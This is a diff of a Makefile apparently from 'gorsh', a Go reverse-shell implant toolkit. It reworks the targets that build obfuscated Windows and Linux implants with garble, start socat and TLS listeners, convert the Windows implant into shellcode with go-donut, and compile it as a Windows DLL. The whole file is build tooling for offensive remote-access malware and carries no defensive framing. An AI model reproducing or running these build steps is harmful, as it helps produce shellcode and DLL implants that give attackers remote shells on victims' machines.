@@ -27,37 +27,40 @@ CXX=x86_64-w64-mingw32-g++
 
 # zStd is a highly efficient compression library that requires CGO compilation If you'd like to
 # turn this feature on and have experience cross-compiling with cgo, enable the feature below for
-# win/64 and linux/64 implants 
+# win/64 and linux/64 implants
 # ZSTD=-tags zstd
 
 all: $(PLATFORMS) servers
 
 ${PLATFORMS}: $(GARBLE) $(PKEY) $(SRV_KEY)
-	GOOS=${target} ${BUILD} -ldflags ${LD.${target}} -o ${OUT}/${APP}.${target} cmd/gorsh/*
+	GOOS=${target} ${BUILD} -ldflags ${LD.${target}} \
+			 -o ${OUT}/${APP}.${target} \
+			 cmd/gorsh/*
 
-listen-socat: $(SRV_KEY)
-	KEY=${SRV_KEY} PEM=${SRV_PEM} LISTEN=scripts/listen-socat.sh scripts/start.sh
-
-listen: $(SRV_KEY)
-	KEY=${SRV_KEY} PEM=${SRV_PEM} LISTEN=scripts/listen.sh scripts/start.sh
+listen listen-socat: $(SRV_KEY)
+	KEY=${SRV_KEY} \
+			PEM=${SRV_PEM} \
+			LISTEN=scripts/${target}.sh \
+			scripts/start.sh
 
 server:
-	GOOS=linux ${BUILD} -ldflags ${LD.linux} -o ${OUT}/srv/gorsh-server cmd/gorsh-listen/*
+	GOOS=linux ${BUILD} -ldflags ${LD.linux} \
+		-o ${OUT}/srv/gorsh-server \
+		cmd/gorsh-listen/*
 
-windll:
-	# https://stackoverflow.com/questions/40573401/building-a-dll-with-go-1-7
-	@cp cmd/gorsh/main.go ${OUT}/${APP}.go
-	@sed -i '1 a import "C"' ${OUT}/${APP}.go
-	@echo '//export Run' >> ${OUT}/${APP}.go
-	@echo 'func Run() { main() }' >> ${OUT}/${APP}.go
-	@cp scripts/gorsh.c ${OUT}/
+shellcode: $(GODONUT) windows
+	${GODONUT} --arch x64 --verbose \
+		--in ${OUT}/${APP}.windows \
+		--out ${OUT}/${APP}-windows-sc.bin \
 
-	CGO_ENABLED=1 CC=${MINGW} CXX=${CXX} \
-		GOOS=windows ${BUILD} ${LINUX_LDFLAGS} ${ZSTD} \
-		-buildmode=c-archive \
-		-o ${OUT}/${APP}.a ${OUT}/${APP}.go
-
-		${MINGW} -shared -pthread -o ${OUT}/${APP}.dll ${OUT}/${APP}.c ${OUT}/${APP}.a -lwinmm -lntdll -lws2_32
+dll:
+	GOOS=windows CGO_ENABLED=1 CC=${MINGW} \
+	go build \
+		-buildmode=c-shared \
+		-trimpath \
+		-ldflags ${LD.windows} \
+		-o ${OUT}/${APP}.windows.dll \
+		cmd/gorsh-dll/dllmain.go
 
 clean:
 	rm -rf ${OUT} ${PKEY}* certs/*
